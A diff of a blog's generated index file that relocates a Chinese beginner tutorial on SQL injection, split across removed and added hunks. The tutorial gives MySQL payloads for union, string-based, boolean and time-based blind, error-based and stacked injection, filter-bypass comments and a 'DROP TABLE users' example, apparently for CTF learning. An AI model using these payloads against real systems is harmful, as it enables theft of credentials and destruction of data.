-<li><code>concat_ws()</code>：用法类似</li>
-<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
-<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
-<li><code>CHAR()</code>：把整数转换为对应的字符</li>
-<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
-<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
-</ul>
-<h3 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们开局举的例子就是一个很典型的数字型注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<p>我们可用理解为两个部分 原有语句 <code>SELECT username,password FROM users WHERE id =</code>和用户输入部分<code>$_GET[&quot;id&quot;]</code>。</p>
-<p>前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。</p>
-<p>然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：</p>
-<ul>
-<li>使用 <code>Order by</code> 确定列数，方便后续注入。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 Order by 1;</span><br><span class="line">id = 1 Order by 2;</span><br><span class="line">id = 1 Order by 3; # 报错 确定列数为 2 </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br><span class="line"># or</span><br><span class="line">1 union SELECT schema_name,2 FROM information_schema.schemata;</span><br><span class="line"># 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。</span><br><span class="line"># 此时后台执行为:</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261957162.png" alt="image-20230426195745130"></p>
-<p> 也可以把1换成其他的，比如<code>database()</code> 这样我们可以知道我们当前在哪个数据库</p>
-<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261959665.png" alt="image-20230426195952638"></p>
-<ul>
-<li>下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( <code>database()</code> ) 的表，再去看其他库的。</li>
-</ul>
-<p>这里我们基于<code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br><span class="line"># 原理同上</span><br><span class="line"># 如果要查询其他数据库 可以写为 where table_schema=&#x27;databaseNAME&#x27;</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262013324.png" alt="image-20230426201306290"></p>
-<ul>
-<li>下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作</li>
-</ul>
-<p>这里我们使用<code>UNION</code> <code>GROUP_CONCAT(column_name)</code> 和 <code>information_schema.columns</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262026058.png" alt="image-20230426202627021"></p>
-<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。</p>
-<p>与数字型不同的是，我们需要先构造单引号的闭合。</p>
-<p>这里我们让 <code>$username</code>&#x3D; <code>-1&#39; or &#39;1&#39;=&#39;1&#39; --</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262032468.png" alt="image-20230426203250434"></p>
-<p>就可以使<code>Where</code>的条件永真,直接输出<code>SELECT * FROM users</code>的所有内容。</p>
-<p>同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。</p>
-<p><code>order by</code>判断列数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262132275.png" alt="image-20230426213252233"></p>
-<p>那么接下来就和数字型注入相同 吧 <code>order by NUM</code> 换成对应的语句即可：</p>
-<ul>
-<li>库名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>表名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>- 字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
-<p>我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>对于上述语句，如果id的传参如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND 1=1</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND 1=1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041911785.png" alt="image-20230504191135714"></p>
-<p>这里会要求两个条件为真，一是有<code>id=1</code>这个值，二是 <code>1=1</code>，这两个条件当然是满足的，特别是后面的这个条件。</p>
-<p>那如果我让AND后面的条件为 <code>1 = 2</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"># 这里 &#x27;1&#x27; = &#x27;2&#x27;，1 = 2 效果都是一样的</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041915652.png" alt="image-20230504191548610"></p>
-<p>可以看到返回为空，因为AND后面的条件不满足。</p>
-<p>那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：</p>
-<ul>
-<li>使用 length(）获取长度信息</li>
-</ul>
-<p>比如，我们用 length(）函数去爆破数据长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)= NUM</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND length(username)=1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041921180.png" alt="image-20230504192130407"></p>
-<p>当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)&lt; NUM</span><br><span class="line">id = 1 AND length(username)&gt; NUM</span><br></pre></td></tr></table></figure>
-
-<p>这样效率会高很多。</p>
-<ul>
-<li><code>SUBSTR()</code>函数用于截取字符串中的一部分。利用<code>SUBSTR()</code>函数，逐步截取数据库中的某个数据：</li>
-</ul>
-<p><code>SUBSTR(string, start, length)</code> 其中，<code>string</code>表示要截取的字符串，<code>start</code>表示截取的起始位置，<code>length</code>表示截取的长度。<code>SUBSTR()</code>函数会从字符串的<code>start</code>位置开始，截取指定长度的字符。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND SUBSTR(username,1,1) = &#x27;?&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = &#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042115906.png" alt="image-20230504211550827"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = &#x27;d&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042121944.png" alt="image-20230504212127894"></p>
-<p>通过前部分长度的获取，结合 <code>substr()</code> 就可以对一个具体的字符数据进行fuzz了。</p>
-<p>这里推荐编写脚本来完成这样繁琐的工作。</p>
-<p>除了上述用法 <code>SUBSTR()</code>函数还可以用于替换字符串中的某个字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET username=SUBSTR(username,1,3)||&#x27;***&#x27;||SUBSTR(username,7) WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为<code>***</code></p>
-<p>通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>MID()</code>函数也是用于截取字符串的函数。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MID(string, start, length)</span><br><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>CONCAT()</code></li>
-</ul>
-<p><code>CONCAT()</code>函数用于将多个字符串连接成一个字符串。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042218959.png" alt="image-20230504221859903"></p>
-<p>而在盲注中，我们通常用其的连接功能减少查询跳转。</p>
-<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。</p>
-<p>下面是一些常用函数 和使用技巧：</p>
-<ul>
-<li><code>IF()</code></li>
-</ul>
-<p><code>IF()</code>函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(condition, value_if_true, value_if_false)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>condition</code>表示要判断的条件，<code>value_if_true</code>表示条件成立时要返回的值，<code>value_if_false</code>表示条件不成立时要返回的值。如果条件成立，<code>IF()</code>函数将返回<code>value_if_true</code>，否则将返回<code>value_if_false</code></p>
-<ul>
-<li><code>SLEEP()</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)</span><br></pre></td></tr></table></figure>
-
-<p>当语句被执行时，程序将会暂停指定秒数，比如下面的例子：</p>
-<p>通常 <code>IF</code> 和 <code>SLEEP</code> 两函数会一起使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(SLEEP(5),1,0)</span><br></pre></td></tr></table></figure>
-
-<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。</p>
-<p>同样我们使用我们的demo语句，<code>SELECT username,password FROM users WHERE id =</code>来演示：</p>
-<ul>
-<li>利用延时函数，如<code>SLEEP()</code>函数或者<code>BENCHMARK()</code>函数，来判断是否注入成功。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>如果用户表中的第一个用户名字符为字母<code>a</code>，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li>利用时间戳</li>
-</ul>
-<p>可以利用数据库中的时间戳函数，如<code>UNIX_TIMESTAMP()</code>函数来构造延时语句，如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()&gt;1620264296,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>上述SQL语句的意思是：如果当前时间戳大于<code>1620264296</code>，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li>利用函数返回值</li>
-</ul>
-<p>可以利用函数的返回值，如<code>LENGTH()</code>函数、<code>SUBSTR()</code>函数等，来判断是否注入成功。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li><code>BENCHMARK()</code></li>
-</ul>
-<p><code>BENCHMARK()</code>函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。<code>BENCHMARK()</code>函数的语法通常如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>count</code>表示要重复执行的次数，<code>expr</code>表示要重复执行的语句。</p>
-<p>看这个例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(BENCHMARK(10,MD5(&#x27;test&#x27;)),1,0)</span><br></pre></td></tr></table></figure>
-
-<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回；否则，程序将会重复执行<code>MD5(&#39;test&#39;)</code>函数10次后再返回结果</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>顾名思义，通过报错信息获取数据的方法。</p>
-<ul>
-<li><code>updatexml()</code></li>
-</ul>
-<p>这里我们先讲 <code>updatexml()</code> 报错注入。</p>
-<p><code>updatexml()</code> 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML(xml_target, xpath_expr, new_value)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>xml_target</code>是要更新的XML数据，<code>xpath_expr</code>是要更新的节点路 径，<code>new_value</code>是新的节点值。</p>
-<p>但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>那么通过这个特性，我们用 <code>concat()</code> 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) </span><br></pre></td></tr></table></figure>
-
-<p>输出:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~8.0.12&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>不过要注意的是 <code>updatexml()</code> 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：</p>
-<ul>
-<li><code>LIMIT()</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,</span><br><span class="line">(select username from users </span><br><span class="line">limit 1,1)),</span><br><span class="line">3);</span><br><span class="line"># 不断改变limit NUM,1 的值逐行获取</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050110708.png" alt="image-20230505011056626"></p>
-<ul>
-<li><p><code>substr()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),</span><br><span class="line">1,31)</span><br><span class="line">),3);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>执行结果：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),1,31)</span><br><span class="line">),3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~admin,super,flag,null&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>利用利用上述特性，我们可以下面的语句获取信息：</p>
-<p>获取所有数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(schema_name)</span><br><span class="line">                from information_schema.schemata)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<p>获取所有表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(table_name)</span><br><span class="line">                from information_schema.tables</span><br><span class="line">                where table_schema = &#x27;security&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<p>获取所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(column_name)</span><br><span class="line">                from information_schema.columns</span><br><span class="line">                where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>extractvalue()</code></li>
-</ul>
-<p><code>extractvalue()</code>是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。</p>
-<p>正常情况下他的语法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expr)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>xml_target</code>是要提取节点值的XML数据，<code>xpath_expr</code>是要提取的节点路径。</p>
-<p>它用于报错注入的方法其实和 <code>updatexml()</code> 函数的使用方法差不多 但是参数少一个x</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050150790.png" alt="image-20230505015028726"></p>
-<p>而且报错信息长度限制也和<code>updatexml()</code> 一样，所以这里就不多做赘述。</p>
-<ul>
-<li><code>floor()</code></li>
-<li><code>exp()</code></li>
-</ul>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。</p>
-<p>其实讲原理就很容易懂：</p>
-<p>在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。</p>
-<p>举个栗子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
-
-<p>执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到<code>users</code>表中的用户名和密码，并且将<code>users</code>表删除。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2920,6 +2590,336 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
 ]]></content>
       <tags>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入</title>
+    <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><span id="more"></span>
+
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。</p>
+<p>比如下面的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>对于他的预期操作，一般一个id是用来索引的,传入的值应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] = 1;</span><br><span class="line">$_GET[&quot;id&quot;] = 2;</span><br></pre></td></tr></table></figure>
+
+<p>所以预期执行的语句应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  1&quot;;</span><br><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  2&quot;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>在没有过滤的情况下，我们能够在后面拼接我们自己的语句</p>
+<p>比如，我们传入的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] =&quot;1 union select username,password from user&quot;</span><br></pre></td></tr></table></figure>
+
+<p>那么最后执行的语句就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = 1 union select username,password from user;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261635588.png" alt="image-20230426163533547"></p>
+<p>这样就造成了非预期语句的执行，我们在获得 <code>users</code> 表中的预期数据的同时也获得了 <code>users</code> 表中的非预期数据。</p>
+<p>当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。</p>
+<p>下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。</p>
+<h3 id="SQL数据库基础"><a href="#SQL数据库基础" class="headerlink" title="SQL数据库基础"></a>SQL数据库基础</h3><h4 id="数据库结构基础"><a href="#数据库结构基础" class="headerlink" title="数据库结构基础"></a>数据库结构基础</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261646646.png" alt="image-20230426164654561"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261652391.png" alt="image-20230426165200366"></p>
+<p>如图所示 数据库 为层级结构：</p>
+<ul>
+<li>数据库 ( database )</li>
+<li>表 ( table )<ul>
+<li>列 (column)</li>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+<h4 id="数据库语法基础¶"><a href="#数据库语法基础¶" class="headerlink" title="数据库语法基础¶"></a>数据库语法基础<a href="https://ctf.tj.cn/ctf_web/sql_injection/#_3">¶</a></h4><p>常用语法：</p>
+<ul>
+<li><code>SELECT</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UNION</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">UNION</span><br><span class="line">SELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
+
+<p> 注意 使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
+<ul>
+<li><code>LIMIT</code></li>
+<li><code>SQL SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据 #比如 LIMIT 10, 10 返回11-20行数据</code></li>
+<li><code>SQL SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</code></li>
+<li><code>注释</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br><span class="line">  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格</span><br><span class="line">  #/*中间的内容都将被注释*/</span><br><span class="line">  SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Order by</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br><span class="line"># 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</span><br><span class="line"># 在SQL注入中我们常用它来判断列数</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
+
+<p>常用参数：</p>
+<ul>
+<li><code>user()</code>：当前数据库用户</li>
